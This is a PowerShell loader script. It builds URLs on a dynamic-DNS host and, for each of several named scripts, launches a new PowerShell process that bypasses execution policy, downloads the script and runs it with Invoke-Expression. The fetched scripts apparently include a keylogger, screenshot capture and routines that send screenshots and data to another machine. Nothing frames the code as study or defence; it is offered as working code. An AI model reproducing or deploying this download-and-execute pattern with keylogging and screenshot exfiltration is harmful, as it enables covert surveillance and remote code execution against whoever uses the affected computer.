# Path to the directory containing all the scripts
$scriptPath = "https://rapid.tlnas.duckdns.org/uploads/"

# Function to execute a remote script in a new PowerShell process
function Execute-Script {
    param (
        [string]$script
    )
    try {
        $scriptUrl = "$scriptPath$script"
        Write-Output "Executing $script in a new PowerShell instance..."

        # Force a completely new and detached PowerShell instance
        Start-Process -FilePath powershell.exe `
            -ArgumentList "-executionpolicy Bypass -NoExit -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('$scriptUrl')" `
            -NoNewWindow:$false

        Write-Output "$script executed successfully (or finished execution)."
    } catch {
        # Log the error but continue to the next script
        Write-Warning "Error executing script from scriptUrl: ${_}"
    }
}

# Execute scripts sequentially with delays
Execute-Script -script "currentScript.ps1"
Start-Sleep -Seconds 10

Execute-Script -script "SendMLData.ps1"

Execute-Script -script "calibration_with_pi.ps1"

Execute-Script -script "send_screenshot_toPI.ps1"

Execute-Script -script "screenshot.ps1"

Execute-Script -script "keylog.ps1"

Write-Output "All scripts executed."